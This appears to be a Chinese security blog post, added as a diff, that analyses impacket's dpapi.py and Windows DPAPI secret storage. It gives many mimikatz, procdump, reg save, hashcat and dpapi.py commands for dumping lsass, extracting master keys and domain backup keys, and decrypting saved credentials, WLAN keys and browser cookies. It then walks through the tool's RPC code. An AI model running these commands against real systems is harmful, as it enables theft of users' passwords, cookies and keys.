@@ -1,0 +1,589 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>impacket -- dpadpi浅析 | Iceberg-N</title>
+
+<link rel="shortcut icon" href="https://iceberg-n.github.io/favicon.ico?v=1700038557646">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://iceberg-n.github.io/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+    
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            Iceberg-N
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="https://iceberg-n.github.io" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1700038557646"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    impacket -- dpadpi浅析
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2023-11-14 ·
+                    </time>
+                    
+                        <a href="https://iceberg-n.github.io/tag/impacket/" class="post-tags">
+                            # impacket
+                        </a>
+                    
+                        <a href="https://iceberg-n.github.io/tag/rpc/" class="post-tags">
+                            # rpc
+                        </a>
+                    
+                        <a href="https://iceberg-n.github.io/tag/nei-wang/" class="post-tags">
+                            # 内网
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="dpadpi浅析">dpadpi浅析</h1>
+<!-- more -->
+<h2 id="简介">简介</h2>
+<p><strong>作用：</strong> 获取Master Key，或者通过Master Key解密DPAPI</p>
+<p><strong>条件：</strong> 无需凭据，提供目标地址即可；</p>
+<h3 id="dpapi">DPAPI</h3>
+<p>DPAPI是一个提供数据保护服务的Windows API；主要用于加密解密数据；</p>
+<p>DPAPI 用于加密了：</p>
+<ul>
+<li>Chrome、Edge、IE 浏览器中用户保存的密码与 Cookie</li>
+<li>Outlook、Windows Mail 中用户保存的密码</li>
+<li>RDP 连接的密码</li>
+<li>保存的 WLAN 密码</li>
+<li>EFS 的私钥</li>
+<li>等</li>
+</ul>
+<h3 id="master-key">Master Key</h3>
+<p>Master Key为DPAPI过程中加密用的密钥，加密后的密文叫做Blob；分为用户Master Key和系统Master Key；</p>
+<p>用户Master Key存储位置：<code>%UserProfile%\AppData\Roaming\Microsoft\Protect\[SID]</code>；</p>
+<p>系统Master Key存储位置：</p>
+<ol>
+<li>
+<p><code>C:\Windows\System32\Microsoft\Protect\S-1-5-18</code>(当调用 C 或者.NET API 进行 DPAPI 加密，且选择了当前机器加密，会使用此目录的 Master Key)；</p>
+</li>
+<li>
+<p><code>C:\Windows\System32\Microsoft\Protect\S-1-5-18\User</code>(用于加密 Windows Vault、企业 WLAN 凭据)；</p>
+</li>
+</ol>
+<p>Master Key为隐匿文件，查看方法：</p>
+<pre><code># 查看隐匿文件
+dir /a
+
+#取消隐匿
+attrib -h -s *
+</code></pre>
+<p>Master Key 本身也是被加密的</p>
+<ul>
+<li>在工作组环境中，需要 SID、用户密码的 SHA1 哈希来解密；</li>
+<li>在域环境中，需要 SID、用户密码的 NT 哈希来解密，或者使用域备份密钥来解密；</li>
+</ul>
+<h4 id="解密master-key">解密Master Key</h4>
+<h5 id="在线获得明文-master-key">在线获得明文 Master Key</h5>
+<p>获取用户 Master Key</p>
+<pre><code class="language-batch">.\mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::dpapi&quot; exit
+</code></pre>
+<p>获取系统 Master Key</p>
+<pre><code class="language-batch">.\mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::dpapisystem&quot; exit
+.\mimikatz &quot;privilege::debug&quot; &quot;lsadump::secrets&quot; exit
+12
+</code></pre>
+<h5 id="在线解密用户-master-key">在线解密用户 Master Key</h5>
+<p>调用 RPC 解密用户 Master Key</p>
+<pre><code>python dpapi.py masterkey -t [域]/[用户名]:[密码]@[IP] -file [Master Key文件名]
+.\mimikatz &quot;dpapi::masterkey /in:[Master Key文件名] /dc:[域控域名] /rpc&quot; exit
+</code></pre>
+<h5 id="导出-lsass-内存获得明文用户-master-key">导出 lsass 内存获得明文用户 Master Key</h5>
+<p>使用 procdump 导出 lsass 的内存</p>
+<pre><code class="language-batch">.\procdump64 -accepteula -ma lsass.exe lsass.dump
+</code></pre>
+<p>使用 mimikatz，加载内存文件，导出明文 Master Key</p>
+<pre><code class="language-batch">.\mimikatz &quot;sekurlsa::minidump lsass.dump&quot; &quot;sekurlsa::dpapi&quot; exit
+</code></pre>
+<h5 id="密码解密用户-master-key">密码解密用户 Master Key</h5>
+<p>使用用户的密码解密用户 Master Key 还需要用户的 SID，SID 可以从存储用户 Master Key 的目录名字得到<br>
+如果用户在域环境中，用户 Master Key 目录中还会有一个 <code>BK-[域]</code> 的文件，可以从中提取 SID</p>
+<p>使用 impacket 解密用户 Master Key</p>
+<pre><code>python dpapi.py masterkey -file [Master Key文件名] -sid [SID] -password [用户密码]
+</code></pre>
+<p>mimikatz 解密域用户 Master Key 需要加 /protected 参数，还可以使用 SHA1 或者 NT 哈希解密</p>
+<pre><code class="language-batch">#工作组用户
+.\mimikatz &quot;dpapi::masterkey /in:[Master Key文件名] /sid:[SID] /password:[用户密码]&quot; exit
+.\mimikatz &quot;dpapi::masterkey /in:[Master Key文件名] /sid:[SID] /hash:[用户密码SHA1]&quot; exit
+
+#域用户
+.\mimikatz &quot;dpapi::masterkey /in:[Master Key文件名] /sid:[SID] /password:[用户密码] /protected&quot; exit
+.\mimikatz &quot;dpapi::masterkey /in:[Master Key文件名] /sid:[SID] /hash:[用户密码NT] /protect&quot; exit
+1234567
+</code></pre>
+<p>需要注意，在 Windows 10 或 11 使用微软账号登录的用户，不能直接用微软账号的密码解密用户 Master Key<br>
+需要使用微软账号的密码来解密微软账号的缓存文件，获得解密 Master Key 的密码</p>
+<p>微软账户的缓存文件位于：<code>C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\CloudAPCache\MicrosoftAccount\[账号ID]\Cache\CacheData</code></p>
+<p>可以使用 MadPassExt 计算 <a href="https://www.nirsoft.net/utils/microsoft_account_dpapi_password.html">Microsoft Account DPAPI Password Extractor</a></p>
+<h5 id="爆破用户-master-key-密码">爆破用户 Master Key 密码</h5>
+<p>如果没有用户的密码或哈希，可以尝试爆破密码，再使用密码解密</p>
+<p>Master Key 根据环境和系统版本有三种计算方式：local、domain1607-、domain1607+，后两者的区别在于是否安装 Windows 10 1607 更新，Windows 在 1607 后添加了 PBKDF2 用于密钥派生</p>
+<p>使用 john 获得哈希值</p>
+<pre><code>python DPAPImk2john.py -S [SID] -mk [Master Key文件名] -c [local,domain1607-,domain1607+]
+</code></pre>
+<p>也可以用 john 直接尝试密码是否正确，正确会输出 1</p>
+<pre><code>python DPAPImk2john.py -S [SID] -mk [Master Key文件名] -c [local,domain1607-,domain1607+] --password [用户密码]
+</code></pre>
+<p>使用 hashcat 和 rockyou 爆破</p>
+<pre><code class="language-powershell">.\hashcat -m 15900 -a 0 -D 2 hash.txt rockyou.txt
+</code></pre>
+<h5 id="域备份密钥解密用户-master-key">域备份密钥解密用户 Master Key</h5>
+<p>域备份密钥存储在 lsass 的内存中和 ntds.dit 中</p>
+<p>登录域控，获取备份私钥，保存为 pvk 文件</p>
+<pre><code>python dpapi.py backupkeys -t [域]/[用户名]:[密码]@[域控IP] --export
+.\mimikatz &quot;privilege::debug&quot; &quot;lsadump::backupkeys /system:[域控域名] /export&quot; exit
+</code></pre>
+<p>使用 DSInternals 离线使用 ntds.dit 和 BootKey 获取备份私钥，保存为 pvk 文件</p>
+<pre><code>Get-ADDBBackupKey -BootKey [bootKey 密钥] -DataBasePath ntds.dit | Save-DPAPIBlob -DirectoryPath .
+</code></pre>
+<p>解密用户 Master Key</p>
+<pre><code class="language-powershell">python dpapi.py masterkey -file [Master Key文件名] -pvk [PVK文件名]
+</code></pre>
+<h5 id="注册表解密系统-master-key">注册表解密系统 Master Key</h5>
+<p>获得系统 Master Key 的密钥需要用到注册表的 SYSTEM 和 SECURITY<br>
+SECURITY 中存储了加密的密钥，需要使用 BootKey 解密</p>
+<pre><code class="language-batch">reg save HKLM\SYSTEM SYSTEM
+reg save HKLM\SECURITY SECURITY
+12
+</code></pre>
+<p>获取加密 Master Key 的密钥，会得到 dpapi_machinekey 和 dpapi_userkey，分别解密非 User 目录下的系统 Master Key 和 User 目录下的系统 Master Key</p>
+<pre><code>python secretsdump.py -system SYSTEM -security SECURITY local
+.\mimikatz &quot;lsadump::secrets /system:SYSTEM /security:SECURITY&quot; exit
+</code></pre>
+<p>解密系统 Master Key</p>
+<pre><code>python dpapi.py masterkey -file [系统Master Key路径] -key [dpapi_machinekey]
+python dpapi.py masterkey -file [系统Master Key路径] -key [dpapi_userkey]
+12
+</code></pre>
+<p>或者直接让 dpapi.py 读取 SYSTEM 和 SECURITY，自动解密</p>
+<pre><code>python dpapi.py masterkey -file [Master Key文件名] -system SYSTEM -security SECURITY
+</code></pre>
+<h3 id="blob">Blob</h3>
+<p>Blob 即是使用 DPAPI 加密后的数据，被 Master key 加密；<br>
+如果用户没有设置额外的密码，那么使用明文的 Master Key，就可以直接解密;</p>
+<p>任何被DPAPI加密后的数据都可以叫做Blob；</p>
+<p><strong>常用命令</strong></p>
+<pre><code>python dpapi.py unprotect -file [DPAPI Blob文件名] -key [解密后的Master Key（0x开头）]
+python dpapi.py unprotect -file [DPAPI Blob文件名] -key [解密后的Master Key（0x开头）] -entropy [额外的密码]
+12
+.\mimikatz &quot;dpapi::blob /in:[DPAPI Blob文件名] /masterkey:[解密后的Master Key（无0x开头）] /unp
+</code></pre>
+<h3 id="credential">Credential</h3>
+<p>Credential 负责管理凭据管理器中的 Windows 凭据；<br>
+<img src="https://iceberg-n.github.io/post-images/1699945581162.png" alt="" loading="lazy"></p>
+<p>Windows 凭据及保存RDP账号密码；<br>
+<img src="https://iceberg-n.github.io/post-images/1699945591697.png" alt="" loading="lazy"></p>
+<p>普通凭据分为本地凭据和企业凭据，可以在详情密码查看；<br>
+<img src="https://iceberg-n.github.io/post-images/1699945607606.png" alt="" loading="lazy"></p>
+<p><strong>Credential存储路径</strong></p>
+<ol>
+<li>
+<p>凭据存储地址(User Master Key)：<code>%UserProfile%\AppData\Local\Microsoft\Credentials</code>(保存windows凭据和普通凭据中的本地凭据)</p>
+</li>
+<li>
+<p>凭据存储地址(User Master Key)：<code>%UserProfile%\AppData\Roaming\Microsoft\Credentials</code>(保存基于证书的凭据和普通凭据中的企业凭据)</p>
+</li>
+</ol>
+<p><strong>常用命令</strong></p>
+<ul>
+<li>impacket</li>
+</ul>
+<pre><code class="language-powershell">python dpapi.py credential -file [Credentials文件名] -key [解密后的Master Key（0x开头）]
+</code></pre>
+<ul>
+<li>mimikatz</li>
+</ul>
+<pre><code>.\mimikatz &quot;dpapi::cred /in:[Credentials文件名] /masterkey:[解密后的Master Key（无0x开头）]&quot; exit
+</code></pre>
+<h3 id="vault">Vault</h3>
+<p>Vault 负责管理凭据管理器中的 Web 凭据<br>
+<img src="https://iceberg-n.github.io/post-images/1699945620298.png" alt="" loading="lazy"></p>
+<p>Windows Vault 保存的凭据存储在 vcrd 文件中，vcrd 文件使用 vpol 文件中的密钥进行 AES-CBC 加密，而 vpol 文件又被 Master Key 加密；</p>
+<p><strong>Vault 存储目录</strong></p>
+<ol>
+<li>
+<p><code>%UserProfile%\AppData\Local\Microsoft\Vault</code>：保存 Web 凭据，由用户 Master Key 加密</p>
+</li>
+<li>
+<p><code>C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Vault</code>：保存 Windows 生物特征密钥，由 User 目录下的系统 Master Key 加密</p>
+</li>
+<li>
+<p><code>C:\ProgramData\Microsoft\Vault</code>：由 User 目录下的系统 Master Key 加密</p>
+</li>
+</ol>
+<p><strong>常用命令</strong></p>
+<ul>
+<li>
+<p>impacket</p>
+<p>dpapi解密 vpol 文件，得到 AES128 和 AES256 两个密钥</p>
+</li>
+</ul>
+<pre><code>python dpapi.py vault -vpol [VPOL文件名] -key [解密后的Master Key（0x开头）]
+</code></pre>
+<p>​		再使用 AES 密钥解密 vcrd 文件，一般使用 AES256</p>
+<pre><code>python dpapi.py vault -vcrd [VCRD文件名] -key [AES密钥]
+</code></pre>
+<ul>
+<li>mimikatz</li>
+</ul>
+<pre><code>.\mimikatz &quot;dpapi::vault /cred:[VCRD文件名] /policy:[VPOL文件名] /masterkey:[解密后的Master Key（无0x开
+</code></pre>
+<h3 id="credhist">Credhist</h3>
+<p>Credhist 负责保存用户的历史密码哈希，避免修改用户密码后， Master Key 就无法解密了;<br>
+每当用户修改密码时，老密码就会被添加到 Credhist 中，并使用新密码加密，因此有了新用户密码（或者哈希）就可以得到历史密码哈希;</p>
+<p>如何修改密码，这里存在几种情况：</p>
+<ol>
+<li>
+<p>使用命令行修改密码（net user）：不会写入 Credhist，无法解密之前的 Master Key</p>
+</li>
+<li>
+<p>使用 lusrmgr.msc 修改密码：不会写入 Credhist，无法解密之前的 Master Key</p>
+</li>
+<li>
+<p>使用 GUI 修改密码（Windows 会询问当前密码）：会写入 Credhist，可以解密之前的 Master Key</p>
+</li>
+</ol>
+<p><strong>Credhist存储位置</strong></p>
+<p><code>%UserProfile%\AppData\Roaming\Microsoft\Protect</code></p>
+<figure data-type="image" tabindex="1"><img src="https://iceberg-n.github.io/post-images/1699945644300.png" alt="" loading="lazy"></figure>
+<p><strong>常用命令</strong></p>
+<ul>
+<li>mimikatz</li>
+</ul>
+<pre><code>.\mimikatz &quot;dpapi::credhist /in:[CREDHIST文件名] /sid:[SID] /password:[新用户密码]&quot; exit
+.\mimikatz &quot;dpapi::credhist /in:[CREDHIST文件名] /sid:[SID] /sha1:[新用户密码哈希]&quot; exit
+</code></pre>
+<h3 id="preferred">Preferred</h3>
+<p>Preferred 负责存储了目前正在使用的 Master Key 的 GUID 以及过期时间，前 16 字节是 Master Key 的 GUID，后 8 字节是过期时间；</p>
+<p>系统每隔90天会自动生成新的Master Key，旧的不会删除；</p>
+<p><strong>Preferred 存储位置</strong></p>
+<ul>
+<li>
+<p>用户Master Key的Prefered存储地址：<code>%UserProfile%\AppData\Roaming\Microsoft\Protect\[SID]\Preferred</code></p>
+</li>
+<li>
+<p>系统Master Key的Prefered存储地址：<code>C:\Windows\System32\Microsoft\Protect\S-1-5-18</code>和<code>C:\Windows\System32\Microsoft\Protect\S-1-5-18\User</code></p>
+</li>
+</ul>
+<h3 id="cryptoapi">CryptoAPI</h3>
+<p>CryptoAPI 负责存储使用的 RSA 私钥</p>
+<p><strong>CryptoAPI存储地址</strong></p>
+<p>由User Master Key加密</p>
+<p><code>%UserProfile%\AppData\Roaming\Microsoft\Crypto\RSA\[SID]</code></p>
+<p><strong>常用命令</strong></p>
+<pre><code class="language-batch">.\mimikatz &quot;dpapi::capi /in:[私钥文件] /masterkey:[解密后的Master Key（无0x开头）] /unprotect&quot; exit
+</code></pre>
+<h3 id="cng">CNG</h3>
+<p>CNG 负责存储使用的私钥存储目录：</p>
+<p><strong>CNG存储地址</strong></p>
+<p><code>%UserProfile%\AppData\Roaming\Microsoft\Crypto\Keys</code></p>
+<p>由User Master Key 加密</p>
+<p><strong>常用命令</strong></p>
+<pre><code class="language-batch">.\mimikatz &quot;dpapi::cng /in:[私钥文件] /masterkey:[解密后的Master Key（无0x开头）] /unprotect&quot; exit
+</code></pre>
+<h3 id="wlan-凭据">WLAN 凭据</h3>
+<h4 id="个人">个人</h4>
+<p>个人 WLAN 的密码存储位置：</p>
+<ul>
+<li><code>C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\{GUID}\{GUID}.xml</code></li>
+</ul>
+<p>在线可以这样输出密码</p>
+<pre><code class="language-batch">for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in ('netsh wlan show profiles') do @echo%j | findstr -i -v echo | netsh wlan show profiles %j key=clear
+</code></pre>
+<p>由 User 目录下的系统 Master Key 加密</p>
+<pre><code class="language-batch">.\mimikatz &quot;dpapi::wifi /in:[XML文件名] /masterkey:[解密后的Master Key（无0x开头）] /unprotect&quot; exit
+</code></pre>
+<h4 id="企业">企业</h4>
+<p>企业 WLAN 的密码存储位置：</p>
+<ul>
+<li><code>HKCU\Software\Microsoft\Wlansvc\UserData\Profiles\{GUID}\MSMUserData</code></li>
+<li><code>HKEY_USERS\[SID]\Software\Microsoft\Wlansvc\UserData\Profiles\{GUID}\MSMUserData</code></li>
+</ul>
+<p>MSMUserData 是 DPAPI Blob，由 User 目录下的系统 Master Key 加密</p>
+<pre><code class="language-powershell">python dpapi.py unprotect -file MSMUserData.dat -key [解密后的Master Key（0x开头）]
+</code></pre>
+<p>解密后，可以直接得到用户名，如果用户名前面为 <code>0400000002000000</code>，则密码还需要进一步解密，如果前面为 <code>0300000020000000</code>，则密码已经是明文</p>
+<p>如果需要进一步解密密码，加密的密码为 <code>01000000d08c9ddf01</code> 开头，一直到末尾<br>
+加密的密码也是 DPAPI Blob，使用用户 Master Key 加密</p>
+<p>但貌似 impacket 解不开，mimikatz 可以</p>
+<pre><code class="language-batch">.\mimikatz &quot;dpapi::blob /in:pass.dat /masterkey:[解密后的Master Key（无0x开头）] /unprotect&quot; exit
+</code></pre>
+<h3 id="chrome-凭据-cookie">Chrome 凭据 &amp; Cookie</h3>
+<p>Chrome 的相关文件位置：</p>
+<ul>
+<li>数据目录：<code>%UserProfile%\AppData\Local\Google\Chrome\User Data</code></li>
+<li>密钥文件：<code>Local State</code></li>
+<li>历史记录：<code>Default\History</code></li>
+<li>保存的登录凭据数据库：<code>Default\Login Data</code></li>
+<li>Cookie 数据库：<code>Default\Network\Cookies</code></li>
+</ul>
+<p>保存的登录凭据和 Cookie 被 AES-GCM 加密，加密密钥存储在 Local State 的 encrypted_key 中<br>
+而 encrypted_key 是 DPAPI Blob，由用户 Master Key 加密</p>
+<p>先从 Local State 提取出 encrypted_key，Base64 解码，去掉前面的 DPAPI 前缀</p>
+<p>解密，得到 AES 密钥</p>
+<pre><code>python dpapi.py unprotect -file encrypted_key.dat -key [解密后的Master Key（0x开头）]
+</code></pre>
+<p>按照 SQLite 格式打开 Login Data 或者 Cookies，找到 v10 开头的数据，即为 AES 加密数据</p>
+<p>加密数据的格式如下：</p>
+<ul>
+<li><code>encrypted[:3]</code>：v10，表明是 Chrome 80 以上版本</li>
+<li><code>encrypted[3:15]</code>：AES IV</li>
+<li><code>encrypted[15:-16]</code>：AES 加密数据</li>
+<li><code>encrypted[-16:]</code>：AES GCM Tag</li>
+</ul>
+<p>使用 AES 密钥以及上面的参数即可解密</p>
+<h3 id="edge-凭据-cookie">Edge 凭据 &amp; Cookie</h3>
+<p>数据目录：<code>%UserProfile%\AppData\Local\Microsoft\Edge\User Data</code></p>
+<p>其他同 Chrome</p>
+<h2 id="代码分析">代码分析</h2>
+<p>该脚本可以解密5种密钥，分别为masterkey、backupkeys、credential、vault、unprotect；</p>
+<h3 id="masterkey">masterkey</h3>
+<p>先分析masterkey解密，分为离线和在线；</p>
+<h4 id="离线">离线</h4>
+<h4 id="在线">在线</h4>
+<p>transport.DCERPCTransportFactory()创建DCE/RPC传输对象；</p>
+<p>pctransport.set_credentials()设置凭据；</p>
+<p>rpctransport.get_dce_rpc()获取DCE/RPC传输对象；</p>
+<p>访问接口为&quot;\PIPE\protected_storage&quot;；</p>
+<pre><code class="language-PYTHON">rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\PIPE\protected_storage]' % remoteName)
+
+if hasattr(rpctransport, 'set_credentials'):
+    # This method exists only for selected protocol sequences.
+    rpctransport.set_credentials(username, password, domain, lmhash, nthash, self.options.aesKey)
+
+rpctransport.set_kerberos(self.options.k, self.options.dc_ip)
+
+dce = rpctransport.get_dce_rpc()
+dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
+if self.options.k is True:
+    dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
+</code></pre>
+<p>dce.connect()创建RPC连接；</p>
+<p>dce.bind()进行RPC绑定；</p>
+<pre><code class="language-PYTHON">dce.connect()
+dce.bind(bkrp.MSRPC_UUID_BKRP, transfer_syntax = ('8a885d04-1ceb-11c9-9fe8-08002b104860', '2.0'))
+</code></pre>
+<p>对应流量如下：<br>
+<img src="https://iceberg-n.github.io/post-images/1699945676324.png" alt="" loading="lazy"></p>
+<p>bkrp.BackuprKey()格式化请求内容；</p>
+<p>dce.request()发起请求；</p>
+<pre><code class="language-PYTHON">request = bkrp.BackuprKey()
+request['pguidActionAgent'] = bkrp.BACKUPKEY_RESTORE_GUID
+request['pDataIn'] = dk.getData()
+request['cbDataIn'] = len(dk.getData())
+request['dwParam'] = 0
+
+resp = dce.request(request)
+</code></pre>
+<p>通过提取结果中的ppDataOut，提取出masterkey</p>
+<pre><code class="language-PYTHON">beginning=0
+for i in range(len(resp['ppDataOut'])):
+    if resp['ppDataOut'][i]==b'\x00':
+        beginning+=1
+    else:
+        break
+masterkey=b''.join(resp['ppDataOut'][beginning:])
+print('Decrypted key using rpc call')
+print('Decrypted key: 0x%s' % hexlify(masterkey).decode())
+return
+</code></pre>
+<p>对应流量如下：<br>
+<img src="https://iceberg-n.github.io/post-images/1699945685983.png" alt="" loading="lazy"></p>
+<h3 id="backupkeys">BACKUPKEYS</h3>
+<p>SMBConnection()创建SMB连接；</p>
+<p>connection.logon()进行SMB认证；</p>
+<pre><code class="language-PYTHON">connection = SMBConnection(address, address)
+if self.options.k:
+    connection.kerberosLogin(username, password, domain, lmhash, nthash, self.options.aesKey)
+else:
+    connection.login(username, password, domain, lmhash=lmhash, nthash=nthash)
+</code></pre>
+<p>对应流量如下：<br>
+<img src="https://iceberg-n.github.io/post-images/1699945697839.png" alt="" loading="lazy"></p>
+<p>transport.DCERPCTransportFactory()创建DCE/RPC通信；</p>
+<p>rpctransport.set_smb_connection()重新建立SMB通信；</p>
+<p>rpctransport.get_dce_rpc()获取DCE/RPC通道；</p>
+<p>dce.connect()进行连接；</p>
+<p>dce.bind()进行RPC绑定；</p>
+<pre><code class="language-PYTHON">rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:445[\pipe\lsarpc]')
+rpctransport.set_smb_connection(connection)
+dce = rpctransport.get_dce_rpc()
+if self.options.k:
+    dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
+try:
+    dce.connect()
+    dce.bind(lsad.MSRPC_UUID_LSAD)
+except transport.DCERPCException as e:
+    raise e
+</code></pre>
+<p>对应流量如下：<br>
+<img src="https://iceberg-n.github.io/post-images/1699945706621.png" alt="" loading="lazy"></p>
+<p>for循环进行lsad.hLsarRetrievePrivateData()进行hLsarRetrievePrivateData请求，获取私有数据G$BCKUPKEY_PREFERRED；获取guid后继续hLsarRetrievePrivateData请求，获取私有数据；</p>
+<pre><code class="language-PYTHON">for keyname in (&quot;G$BCKUPKEY_PREFERRED&quot;, &quot;G$BCKUPKEY_P&quot;):
+    buffer = crypto.decryptSecret(connection.getSessionKey(), lsad.hLsarRetrievePrivateData(dce,
+                                  resp['PolicyHandle'], keyname))
+    guid = bin_to_string(buffer)
+    name = &quot;G$BCKUPKEY_{}&quot;.format(guid)
+    secret = crypto.decryptSecret(connection.getSessionKey(), lsad.hLsarRetrievePrivateData(dce,
+                                  resp['PolicyHandle'], name))
+    keyVersion = struct.unpack('&lt;L', secret[:4])[0]
+</code></pre>
+<p>一次循环需要hLsarRetrievePrivateData请求两次所以流量中应看到4此hLsarRetrievePrivateData通信，对应流量如下：</p>
+<figure data-type="image" tabindex="2"><img src="https://iceberg-n.github.io/post-images/1699945713837.png" alt="" loading="lazy"></figure>
+<h3 id="credential-2">CREDENTIAL</h3>
+<h2 id="总结">总结</h2>
+<h3 id="更改smb协商版本">更改SMB协商版本</h3>
+<p>SMB协议设置为V2.1</p>
+<p>查看当前impacket包的路径</p>
+<pre><code>import impacket
+print(impacket.__file__)
+</code></pre>
+<p>在impacket\smbconnection.py 50行，将None更改为SMB2_DIALECT_21即可;<br>
+<img src="https://iceberg-n.github.io/post-images/1699945726556.png" alt="" loading="lazy"></p>
+<p>参考文章：</p>
+<p>https://john-doe.icu/dpapi-1/<br>
+https://www.passcape.com/index.php?section=docsys&amp;cmd=details&amp;id=28</p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://iceberg-n.github.io/post/impacket-jie-du-atexec-qian-xi/" class="post-title gt-a-link">
+                    impacket解读 -- atexec浅析
+                </a>
+            </div>
+        
+
+        
+
+        
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">iceberg-N的网安之路</div>
+    <div class="social-container">
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        
+    </div>
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://iceberg-n.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
